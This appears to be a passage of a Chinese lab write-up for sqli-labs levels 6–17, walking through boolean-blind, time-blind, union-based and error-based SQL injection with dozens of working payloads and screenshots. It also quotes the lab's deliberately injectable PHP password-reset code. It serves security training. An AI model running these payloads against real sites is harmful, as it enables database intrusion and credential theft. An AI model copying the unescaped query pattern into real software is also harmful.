| 01101010 |  106   |    6A    |                      j                       |                                    |
| 01101011 |  107   |    6B    |                      k                       |                                    |
| 01101100 |  108   |    6C    |                      l                       |                                    |
| 01101101 |  109   |    6D    |                      m                       |                                    |
| 01101110 |  110   |    6E    |                      n                       |                                    |
| 01101111 |  111   |    6F    |                      o                       |                                    |
| 01110000 |  112   |    70    |                      p                       |                                    |
| 01110001 |  113   |    71    |                      q                       |                                    |
| 01110010 |  114   |    72    |                      r                       |                                    |
| 01110011 |  115   |    73    |                      s                       |                                    |
| 01110100 |  116   |    74    |                      t                       |                                    |
| 01110101 |  117   |    75    |                      u                       |                                    |
| 01110110 |  118   |    76    |                      v                       |                                    |
| 01110111 |  119   |    77    |                      w                       |                                    |
| 01111000 |  120   |    78    |                      x                       |                                    |
| 01111001 |  121   |    79    |                      y                       |                                    |
| 01111010 |  122   |    7A    |                      z                       |                                    |
| 01111011 |  123   |    7B    |                      {                       |                                    |
| 01111100 |  124   |    7C    |                      \|                      |                                    |
| 01111101 |  125   |    7D    |                      }                       |                                    |
| 01111110 |  126   |    7E    |                      ~                       |                                    |
| 01111111 |  127   |    7F    |                 DEL (Delete)                 |                删除                |



+ 同样通过注入以下语句根据返回页面正确与否测试数据库名的后面几个字符

~~~ shell
?id=1" and ascii(substr((select database()),2,1))>101--+
?id=1" and ascii(substr((select database()),3,1))>101--+
?id=1" and ascii(substr((select database()),4,1))>101--+
?id=1" and ascii(substr((select database()),5,1))>101--+
...
~~~



+ 注入以下语句爆破联合数据表名长度

~~~ shell
?id=1" and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>5 --+
~~~

![Less-6_7](./img/Less-6_7.PNG)

返回正确页面，说明联合数据表名长度大于5；同样可调整参数确定联合数据表名长度



+ 逐一爆破联合数据表名

~~~ shell
?id=1"and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>50--+
~~~

![Less-6_8](./img/Less-6_8.PNG)

返回了正确页面，说明联合数据表名第一个字符的<code>ASCII</code>表的十进制大于50



+ 再修改参数逐步爆破整个联合数据表名

~~~ shell
?id=1"and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),2,1))>50--+
?id=1"and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),3,1))>50--+
?id=1"and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),4,1))>50--+
...
~~~



+ 再逐步爆破联合字段名长度

~~~ shell
?id=1" and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）')>20--+
~~~



+ 逐步爆破联合字段名

~~~ shell
?id=1" and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）'),1,1))>99--+
~~~



+ 最后检测想要的内容

~~~ shell
?id=1" and ascii(substr((select group_concat(（字段名）,（字段名）) from （数据表名）),1,1))>50--+
~~~



### Less-7

+ 注入以下语句

~~~ shell
?id=1
~~~

![Less-7_1](./img/Less-7_1.PNG)

输入<code>id=1</code>,页面显示<code>you are in...</code> ，页面回显正确



+ 注入以下语句(单引号)

~~~ shell
?id=1'
~~~

![Less-7_2](./img/Less-7_2.PNG)

当输入<code>id=1'</code>时显示报错但没有报错信息，这和之前的关卡不一样，之前都有报错信息



+ 注入以下语句(双引号)

~~~ shell
?id=1"
~~~

![Less-7_3](./img/Less-7_3.PNG)

当输入<code>id=1"</code>时显示正常所以可断定参数<code>id</code>是单引号字符串，因为单引号破坏了原有语法结构



+ 注入以下语句

~~~ shell
?id=1'--+
~~~

![Less-7_4](./img/Less-7_4.PNG)

输入<code>id=1'--+</code>时报错



+ 注入以下语句

~~~ shell
?id=1')--+
~~~

![Less-7_5](./img/Less-7_5.PNG)

输入id=1')--+发现依然报错



+ 注入以下语句

~~~ shell
?id=1'))--+
~~~

![Less-7_6](./img/Less-7_6.PNG)

再试试是不是双括号注入<code>id=1'))--+</code>，发现页面显示正常。那么它的过关手法和前面就一样了选布尔盲注就可


+ 注入以下语句

~~~ shell
?id=1')) and length((select database()))>7--+
~~~

![Less-7_7](./img/Less-7_7.PNG)

页面显示正常，通过修改数据库长度值再根据页面显示是否正常确定数据库长度值



+ 注入以下语句

~~~ shell
?id=1')) and ascii(substr((select database()),1,1))=115--+
~~~

![Less-7_8](./img/Less-7_8.png)

修改参数根据页面是否回显正确逐一爆破数据库名



+ 再修改参数同时注入以下语句确定联合数据表名长度

~~~ shell
?id=1')) and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>5 --+
~~~

![Less-7_9](./img/Less-7_9.PNG)



+ 修改参数注入以下语句爆破联合数据表名

~~~ shell
?id=1')) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>50--+
~~~

![Less-7_10](./img/Less-7_10.PNG)



+ 修改参数注入以下语句爆破联合字段名长度

~~~ shell
?id=1')) and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）')>20--+
~~~



+ 修改参数注入以下语句爆破字段名

~~~ shell
?id=1')) and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）'),1,1))>99--+
~~~



+ 修改参数爆破想要的内容

~~~ shell
?id=1')) and ascii(substr((select group_concat(（字段名）,（字段名）) from （数据表名）),1,1))>50--+
~~~



### Less-8

+ 正常打开页面

![Less-8_1](./img/Less-8_1.PNG)



+ 注入如下语句

~~~ shell
?id=1
~~~

![Less-8_2](./img/Less-8_2.PNG)



+ 再注入如下语句

~~~ shell
?id=1'
~~~

![Less-8_3](./img/Less-8_3.PNG)

没有错误信息，但是和正确页面不同，所以实际是个错误页面



+ 接下来就和第五关 一样了，返回页面的正确与否可辅助爆破，具体爆破方式直接参考第五关的爆破方法



### Less-9

+ 正常打开页面

![Less-9_1](./img/Less-9_1.PNG)

第九关不管注入什么页面显示的东西都一样，这时布尔盲注不适合，布尔盲注适合页面对错误和正确结果有不同反应。如果页面一直不变这时可用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if</code>函数和<code>sleep()</code>函数。



+ 首先注入<code>if(a,sleep(10),1)</code>，如果a结果是真的那么执行<code>sleep(10)</code>页面延迟10秒，如果a的结果是假的执行1且页面不延迟。通过页面时间判断<code>id</code>参数是单引号字符串

~~~ shell
?id=1' and if(1=1,sleep(5),1) --+
判断参数构造。
~~~

![Less-9_2](./img/Less-9_2.png)

由例子发现时间注入可行



+ 注入如下语句判断数据库名长度

~~~ shell
?id=1'and if(length((select database()))>9,sleep(5),1)--+
判断数据库名长度
~~~

![Less-9_3](./img/Less-9_3.png)

如果数据库名的长度大于9则执行<code>sleep(5)</code>页面延迟五秒，如果数据库名长度不大于9则执行1且页面不延迟



+ 注入如下语句逐一判断数据库字符

~~~ shell
?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
~~~

![](./img/Less-9_4.PNG)



由于页面有延迟，说明数据库名的第一个字符的ASCII字符=115，查询<code>ASCII</code>表可得数据库名第一个字符是's'

![Less-9_5](./img/Less-9_5.png)



+ 注入如下语句逐一判断所有表名长度

~~~ shell
?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
~~~

![Less-9_6](./img/Less-9_6.png)



由于页面有延迟，说明所有表名长度大于13

![Less-9_7](./img/Less-9_7.png)



+ 注入如下语句逐一判断所有表名

~~~ shell
?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
~~~

![Less-9_8](./img/Less-9_8.png)



由于页面有延迟，说明所有数据表名第一个字符的<code>ASCII</code>值大于99

![Less-9_9](./img/Less-9_9.PNG)



+ 
  注入如下语句逐一判断所有字段名的长度

~~~ shell
?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
~~~

由于页面没有延迟，说明所有字段名长度不大于20

![Less-9_10](./img/Less-9_10.png)



+ 注入如下语句逐一判断字段名

~~~ shell
?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
~~~

由于页面有延迟，说明所有字段名第一个字符的<code>ASCII</code>值大于99

![Less-9_11](./img/Less-9_11.png)



+ 注入如下语句逐一判断字段内容长度

  ~~~ shell
  ?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
  ~~~

  由于页面有延迟，说明字段内容长度大于109

  ![Less-9_12](./img/Less-9_12.png)



+ 注入如下语句逐一判断内容

  ~~~ shell
  ?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
  ~~~

  由于页面有延迟，说明内容第一个字符的<code>ASCII</code>值大于50

![Less-9_13](./img/Less-9_13.png)



+ 最终爆破成功



### Less-10

+ 正常打开页面

![Less-10_1](./img/Less-10_1.PNG)

第十关和第九关一样，不管注入什么页面显示的东西都一样，这时布尔盲注不适合，布尔盲注适合页面对错误和正确结果有不同反应。如果页面一直不变这时可用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if</code>函数和<code>sleep()</code>函数。



+ 第十关和第九关采用相同的注入方法，首先注入<code>if(a,sleep(10),1)</code>，如果a结果是真的那么执行<code>sleep(10)</code>页面延迟10秒，如果a的结果是假的执行1且页面不延迟。通过页面时间判断<code>id</code>参数是双引号字符串，这也是第十关唯一与第九关不同的地方

~~~ shell
判断参数构造
?id=1" and if(1=1,sleep(10),1)--+
~~~

![Less-10_2](./img/Less-10_2.PNG)

页面有延迟，说明注入可行



+ 注入如下语句判断数据库长度

~~~ shell
?id=1"and if(length((select database()))>5,sleep(5),1)--+
判断数据库名长度
~~~

![Less-10_3](./img/Less-10_3.PNG)

页面延迟加载说明数据库名长度大于5，改变参数逐一确定数据库名长度



+ 注入如下语句逐一判断数据库名

~~~ shell
?id=1" and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
~~~

![Less-10_4](./img/Less-10_4.PNG)

页面有延迟，说明数据库名的第一个字符的<code>ASCII</code>值是115，判断数据库名的其他字符可逐一改变参数去判断



+ 逐一判断联合数据表名长度

~~~ shell
?id=1"and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
~~~

![Less-10_5](./img/Less-10_5.PNG)

页面有延迟，说明联合数据表名长度大于13，再逐渐改变参数准确判断联合数据表名长度



+ 逐一判断联合数据表名字符

~~~ shell
?id=1" and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
~~~

![Less-10_6](./img/Less-10_6.PNG)

页面有延迟说明联合数据表名的第一个字符的<code>ASCII</code>值大于99，再逐渐改变参数确认联合数据表名的一个字符的<code>ASCII</code>值进而确定联合数据表名的第一个字符，然后再确定联合数据表名的其他字符



+ 判断联合字段名长度

~~~ shell
?id=1" and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>10,sleep(5),1)--+
~~~

![Less-10_7](./img/Less-10_7.PNG)

页面有延迟，说明联合字段名长度大于10，再逐渐改变参数确认联合字段名长度



+ 确定联合字段名字符

~~~ shell
?id=1" and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
~~~

![Less-10_8](./img/Less-10_8.PNG)

页面有延迟，说明联合字段名第一个字符的<code>ASCII</code>值大于99，改变参数确定后联合字段名第一个字符的<code>ASCII</code>值后即可确定联合字段名的第一个字符，再改变参数确定联合字段名的其他字符



+ 逐一检测内容

~~~ shell
?id=1" and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
~~~

![Less-10_9](./img/Less-10_9.PNG)

页面有延迟，说明内容的第一个字符的<code>ASCII</code>值大于50，最终改变参数逐一确定内容的其他字符



+ 爆破完成，就是需要的步骤和内容很多



### Less-11

+ 第十一关页面发生变化，是账户登录页面。则注入点在输入框里。前十关用的是get请求参数都体现在url上，而从十一关开始是post请求，参数在表单里。可直接在输入框注入且参数不是一个还是两个。据前面的认识可猜测sql语句大概形式应该是`username=参数 and password=参数`，只是不知是字符型还是整数型



+ 当输入`1`时出现错误图片

![Less-11_1](./img/Less-11_1.PNG)



+ 当输入`1'` 时出现报错

![Less-11_2](./img/Less-11_2.PNG)

根据报错信息可推断该sql语句`username='参数' and password='参数'`



+ 知道sql语句我们可构造一个恒成立的sql语句看能查询出什么，这里我们用`--+`注释就不行，需换`#`注释， 这个就和我们第一关是一样了。使用联合注入就可以获取数据库信息；首先注入万能语句

~~~ shell
1' or 1=1 #
~~~

![Less-11_3](./img/Less-11_3.PNG)



+ 和第一关一样，先注入以下语句判断回显位置

~~~ shell
1' union select 1,2 #
~~~

![Less-11_4](./img/Less-11_4.PNG)



+ 注入以下语句确定版本和数据库

~~~ shell
1' union select version(),database() #
~~~

![Less-11_5](./img/Less-11_5.PNG)



+ 注入如下语句爆破数据表

~~~ shell
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'security'#
~~~

![Less-11_6](./img/Less-11_6.PNG)



+ 注入语句爆破字段

~~~ shell
1' union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users'#
~~~

![Less-11_7](./img/Less-11_7.PNG)



+ 最后爆破数据

~~~ shell
1' union select 1,group_concat(username,id,password) from users#
~~~

![Less-11_8](./img/Less-11_8.PNG)



### Level-12

+ 首先打开第十二关，可以看到和第十一关的页面类似

![Less-12_1](./img/Less-12_1.PNG)



+ 输入`1`和`1'`页面都没有反应

![Less-12_2](./img/Less-12_2.PNG)



+ 输入<code>1"</code>页面出现报错，可知sql语句是双引号且有括号

![Less-12_3](./img/Less-12_3.PNG)



+ 使用万能语句判断是否存在sql注入

~~~ shell
1") or 1=1
~~~

![Less-12_8](./img/Less-12_8.PNG)



+ 注入语句爆破版本号和数据库名

~~~ shell
1") union select version(),database() #
~~~

![Less-12_4](./img/Less-12_4.PNG)



+ 注入语句爆破数据表

~~~ shell
1") union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'security' #
~~~

![Less-12_5](./img/Less-12_5.PNG)



+ 注入如下语句爆破字段

~~~ shell
1") union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users' #
~~~

![Less-12_6](./img/Less-12_6.PNG)



+ 爆破用户和密码字段

~~~ shell
1") union select 1,group_concat(username,id,password) from users #
~~~

![Less-12_7](./img/Less-12_7.PNG)



### Level-13 POST盲注 回显报错

+ 首先进入第十三关，页面如下

![Less-13_1](./img/Less-13_1.PNG)



+ 使用`updatexml`报错注入

~~~ tex
UPDATEXML (XML_document, XPath_string, new_value)
	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
	第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
	第三个参数：new_value，String格式，替换查找到的符合条件的数据
作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值

当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多
~~~



+ 输入1，页面反应如下没有异常信息

![Less-13_2](./img/Less-13_2.PNG)



+ 注入`1"`，页面正常没有其他错误

![Less-13_4](./img/Less-13_4.PNG)



+ 注入`1'`，页面发生错误，说明`sql`语句是单引号且有括号

![Less-13_3](./img/Less-13_3.PNG)



+ 注入如下语句判断是否存在`sql`注入

~~~ shell
1') or 1=1 # 
~~~

![Less-13_5](./img/Less-13_5.PNG)

由上图，可知确实存在`sql`注入



+ 注入如下语句爆破字段数

~~~ shell
1') order by 3#
~~~

![Less-13_7](./img/Less-13_7.PNG)

有报错回显，说明字段数是3



再注入如下语句爆破字段数

~~~ shell
1') order by 2#
~~~

![Less-13_8](./img/Less-13_8.PNG)

没有报错回显，说明字段数是2



+ 爆破数据库名

~~~ shell
1') union select 1,updatexml(1,concat(0x7e,database(),0x7e),1) #
~~~

![Less-13_9](./img/Less-13_9.PNG)

爆破出数据库名是`security`



+ 注入如下语句爆破数据表名

~~~ shell
1') union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7e),1)#
~~~

![Less-13_10](./img/Less-13_10.PNG)

爆破出所有的数据表：`emails,referers,uagents,users`



+ 注入如下语句爆破列名

~~~ shell
1') union select 1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),0x7e),1)#
~~~

![Less-13_11](./img/Less-13_11.PNG)

爆破出列名：`id,username,password`



+ 注入如下语句爆破出所有数据

~~~ shell
1') union select 1,updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)#
~~~

![Less-13_12](./img/Less-13_12.PNG)

爆破出所有数据：`DumbDumb,AngelinaI-kill-you,Dum`



### Level-14 POST盲注 回显报错

+ 首先进入第十四关，页面如下

![Less-14_1](./img/Less-14_1.PNG)



+ 首先注入<code>1</code>，页面没有反应

![Less-14_2](./img/Less-14_2.PNG)



+ 然后注入<code>1'</code>，页面也没有反应

![Less-14_3](./img/Less-14_3.PNG)



+ 最后注入<code>1"</code>，页面出现报错回显

![Less-14_4](./img/Less-14_4.PNG)



+ 然后注入<code>1" #</code>闭合

![Less-14_5](./img/Less-14_5.PNG)



+ 注入语句看是否有<code>sql</code>语句

~~~ shell
1" or 1=1 # 
~~~

![Less-14_6](./img/Less-14_6.PNG)

登录成功，可看出确实存在<code>sql</code>语句



+ 确认3个回显位

~~~ shell
1" order by 3#
~~~

![Less-14_7](./img/Less-14_7.PNG)



确认是否有2个回显位

~~~ shell
1" order by 2#
~~~

![Less-14_8](./img/Less-14_8.PNG)

由此可确定只有两个回显位



+ 确认数据库名

~~~ shell
1" union select 1,updatexml(1,concat(0x7e,database(),0x7e),1) #
~~~

![Less-14_9](./img/Less-14_9.PNG)



+ 爆破数据表名

~~~ shell
1" union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7e),1)#
~~~

![Less-14_10](./img/Less-14_10.PNG)



+ 爆破数据字段名

~~~ shell
1" union select 1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),0x7e),1)#
~~~

![Less-14_11](./img/Less-14_11.PNG)



+ 爆破数据

~~~ shell
1" union select 1,updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)#
~~~

![Less-14_12](./img/Less-14_12.PNG)



### Level-15 时间盲注

+ 首先打开第十五关如下

![Less-15_1](./img/Less-15_1.PNG)



+ 注入<code>1</code>、<code>1'</code>、<code>1"</code>，发现页面如下

![Less-15_2](./img/Less-15_2.PNG)



+ 注入如下语句

~~~ shell
1' or 1=1 #
~~~

![Less-15_3](./img/Less-15_3.PNG)

返回了正确页面，由上边返回错误页面这里返回正确页面可尝试布尔盲注或时间盲注



+ 判断是否有延时

~~~ shell
admin' and sleep(5) #
~~~

由于<code>1</code>不行没有反应所以<code>admin</code>代替<code>1</code>，而且只能是<code>admin</code>其他字符没有反应

![Less-15_4](./img/Less-15_4.PNG)

页面有延时，则时间盲注可用



+ 爆数据库长度

~~~ shell
admin' and if(length(database())=8,sleep(5),null) #
~~~

![Less-15_5](./img/Less-15_5.PNG)

由于页面产生了延时，所以数据库名长度是8



+ 爆库名，从左边第一个字母开始，判断库名第一个字母是不是`s`

~~~ shell
admin' and if(left(database(),1)='s',sleep(5),null) #

admin' and if(left(database(),2)='se',sleep(5),null) #

......
~~~

![Less-15_6](./img/Less-15_6.PNG)

由于页面有延时，因此数据库名是"se..."。得到的最终结果是<code>security</code>



或者注入如下语句也可，是同样的效果

~~~ shell
admin' and if(ascii(substr(database(),0,1))=115,1,sleep(5))#

admin' and if((select (substr(database(),1,1))="s") ,sleep(5), null)#
~~~



+ 爆表名

~~~ shell
admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),null)#

admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)='em' ,sleep(5),null)#

admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),3)='ema' ,sleep(5),null)#

......
~~~

![Less-15_7](./img/Less-15_7.PNG)

根据页面是否有延时逐个 判断数据表的字符是否正确



+ 一个个测太麻烦，这里就不测下去了，知道可以使用时间盲注就行



### Level-16 时间盲注

+ 首先进入第十六关页面

![Less-16_1](./img/Less-16_1.PNG)



+ 注入<code>1</code>、<code>1'</code>、<code>1"</code>，无法正确闭合

![Less-16_2](./img/Less-16_2.PNG)



+ 注入<code>1")</code>正确闭合<code>sql</code>语句

~~~ shell
1") or 1=1 #
~~~

![Less-16_3](./img/Less-16_3.PNG)

返回了正确页面，由上边返回错误页面这里返回正确页面由此可尝试布尔盲注或时间盲注



+ 判断是否有延时

~~~ shell
admin") and sleep(5) #
~~~

由于<code>1</code>不行没有反应所以<code>admin</code>代替<code>1</code>，而且只能是<code>admin</code>其他字符没有反应

![Less-16_4](./img/Less-16_4.PNG)

页面有延时，则时间盲注可用



+ 爆数据库长度

~~~ shell
admin") and if(length(database())=8,sleep(5),null) #
~~~

![Less-16_5](./img/Less-16_5.PNG)

页面有延迟，说明数据库名长度是8



+ 爆联合数据库名，从左边第一个字母开始，判断库名第一个字母是不是`s`

~~~ shell
admin") and if(left(database(),1)='s',sleep(5),null) #

......
~~~

![Less-16_6](./img/Less-16_6.PNG)

由于页面有延时，因此联合数据库名是"s..."。按照前面十几关的经验，得到的最终结果应该是<code>security</code>



或者注入如下语句也可，是同样的效果

~~~ shell
admin") and if(ascii(substr(database(),0,1))=115,1,sleep(5))#

admin") and if((select (substr(database(),1,1))="s") ,sleep(5), null)#
~~~



+ 爆联合数据表名

~~~ shell
admin") and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),null)#

......
~~~

![Less-16_7](./img/Less-16_7.PNG)

页面有延迟，说明联合数据表名的第一个字符是"e"



+ 爆破数据就不写了，都是一样的思路使用时间盲注，利用页面是否有延迟判断返回数据是否正确



###  Level-17  修改密码 

#### 方法一

+ 首先爆破数据库名

~~~ shell
admin
1' and updatexml(1,concat(0x7e,database(),0x7e),1) #
~~~

![Less-17_1](./img/Less-17_1.PNG)

爆破得到的数据库名是"security"



+ 爆破数据表名

~~~ shell
admin
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7e),1)#
~~~

![Less-17_2](./img/Less-17_2.PNG)



爆破得到的数据表是

~~~ tex
emails,referers,uagents,users
~~~



+ 爆破列名

~~~ shell
admin
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),0x7e),1)#
~~~

![Less-17_3](./img/Less-17_3.PNG)



爆破得到的列名是

~~~ tex
id,username,password
~~~



+ 爆破数据

~~~ shell
admin
1' and (updatexml(1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#
~~~

![Less-17_4](./img/Less-17_4.PNG)



爆破出现错误：

~~~ tex
You can't specify target table 'users' for update in FROM clause
~~~

原因是：

~~~ tex
mysql数据不支持查询和更新是同一张表,所以需加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出该账户的原始密码,如果查询时不是users表就不报错
~~~



#### 方法二

~~~ tex
	根据页面展示是一个密码重置页面，即已经登录系统了，然后查看我们源码，是根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改成你输入的密码。再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够利用的只有更新密码的sql语句。sql语句之前都是查询，这里有一个update更新数据库里面信息。所以之前的联合注入和布尔盲注以及时间盲注都不能用了。这里我们会用到报错注入，用三种mysql报错注入
~~~

![e3e7da7e0e554cd9b13afa172b911963](./img/e3e7da7e0e554cd9b13afa172b911963.png)

~~~ tex
这里介绍的报错注入可以选择extractvalue()报错注入，updatexml()报错注入和group by()报错注入。下面简单说一下者三种报错注入的原理。
~~~



+ **extractvalue报错注入**

~~~ tex
extractvalue(XML_document,XPath_string)
	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
	第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
	作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的。concat和我前面说的的group_concat作用一样
~~~

~~~ shell
1' and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本
1' and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库
 
1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   爆表名
1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c)))# 
 爆字段名
 
1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。
1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。
~~~



+ **updatexml报错注入**

~~~ tex
UPDATEXML (XML_document, XPath_string, new_value)
	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
	第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
	第三个参数：new_value，String格式，替换查找到的符合条件的数据
	作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值
	当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。
~~~

~~~ shell
最后爆字段和上面一样如果加一个中间表

123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
 
123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
   爆字段名
 
123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
爆密码该格式针对mysql数据库。

爆其他表就可以，下面是爆emails表
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
 
1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
~~~



+ **group by报错注入**

[深入理解group by报错注入](https://blog.csdn.net/m0_53065491/article/details/121893986)

~~~ shell
group by报错注入比前面两个复杂一点

123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
 
1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
 
1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
 
1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
~~~



#### 方法三

+ 看下源码

~~~ php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

function check_input($value){
	if(!empty($value)){
		// truncation (see comments)
		$value = substr($value,0,15);
		}
		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc()){
			$value = stripslashes($value);
		}
		// Quote if not a number
		if (!ctype_digit($value)){
			$value = "'" . mysql_real_escape_string($value) . "'";
		}
		else{
		$value = intval($value);
		}
	return $value;
	}

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
//making sure uname is not injectable
$uname=check_input($_POST['uname']);  
$passwd=$_POST['passwd'];

//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'User Name:'.$uname."\n");
fwrite($fp,'New Password:'.$passwd."\n");
fclose($fp);


// connectivity          //查询语句
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
$result=mysql_query($sql);       //应该是上面一句语句的查询结果
$row = mysql_fetch_array($result);     //把查询结果变成一个无序数组
//echo $row;
	if($row)
	{
  		//echo '<font color= "#0000ff">';	
		$row1 = $row['username'];  	
		//echo 'Your Login name:'. $row1;
		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
		mysql_query($update);
  		echo "<br>";
	
		if (mysql_error())
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			print_r(mysql_error());          //返回报错信息！！！！！！！！
			echo "</br></br>";
			echo "</font>";
		}
		else
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			//echo " You password has been successfully updated " ;		
			echo "<br>";
			echo "</font>";
		}
	
		echo '<img src="../images/flag1.jpg"   />';	
		//echo 'Your Password:' .$row['password'];
  		echo "</font>";
	
  	}
	else  
	{
		echo '<font size="4.5" color="#FFFF00">';
		//echo "Bug off you Silly Dumb hacker";
		echo "</br>";
		echo '<img src="../images/slap1.jpg"   />';
		echo "</font>";  
	}
}
?>
~~~

可以看到这里进行查询的语句是"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"。
进行更改密码的语句是"UPDATE users SET password = '$passwd' WHERE username='$row1'"。

